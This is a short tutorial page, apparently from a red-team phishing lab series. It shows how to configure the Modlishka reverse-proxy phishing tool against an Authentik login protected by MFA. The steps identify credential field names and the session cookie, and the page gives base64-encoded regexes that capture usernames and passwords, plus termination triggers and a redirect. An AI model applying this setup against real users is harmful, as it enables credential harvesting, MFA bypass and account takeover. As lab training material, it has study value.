+++
title = "Reconfigure Modlishka With MFA Authentication Provider"
weight = 75
+++

Let's go through the authentication flow to determine what the username and password fields when conducting a normal login. First thing we want to do is open developer tools and ensure 'Persist Logs` is checked.

![Persist Logs](/static/how-to-phishing/authentik-devtools-persist-logs.png)

Now we can fill out the username field, press login, then look for the POST request.

![Username Request](/static/how-to-phishing/authentik-username-post-request.png)

Lets fillet our password and do the same.

![Password Request](/static/how-to-phishing/authentik-password-post-request.png)

We can see that the fields are `uid_field` and `password`.

Now we need to find a URL path that is only hit when the target successfully logs in. Lets finish the authentication process by completing the MFA challenge.

![Successful Login Request](/static/how-to-phishing/authentik-login-success-request.png)

Lets use `/if/user`.

Now we need to determine the session cookie.

![Authentik Session Cookie](/static/how-to-phishing/authentik-session-cookie.png)

Looks like `authentik_session` maybe the one we are after. We are lucky they used descriptive names and very few cookies.

We have all the required information to reconfigure Modlishka. Now we nee to start updating Modlishka configuration. We'll start with the `"target"` in Modlishka's configuration.

```json
  "target": "auth.target.docker:9000",
```

Now we need to create some regular expressions to match the username and password fields.

```bash
echo -n '"uid_field":\s*"(.+?)"' | base64
echo -n '"password":\s*"(.+?)"' | base64
```

![Base64 Cred Params](/static/how-to-phishing/modlishka-config-cred-params-base64.png)

We'll join these two values together with a comma, then update the `"credParams"` configuration value.

```json
  "credParams": "InVpZF9maWVsZCI6XHMqIiguKz8pIg==,InBhc3N3b3JkIjpccyoiKC4rPyki"
```

Finally, we need to update the `"terminateTriggers"` and `"terminateRedirectUrl"`.

```json
  "terminateRedirectUrl": "https://uvcyber.com/?phished",
  "terminateTriggers": "/if/user",
```
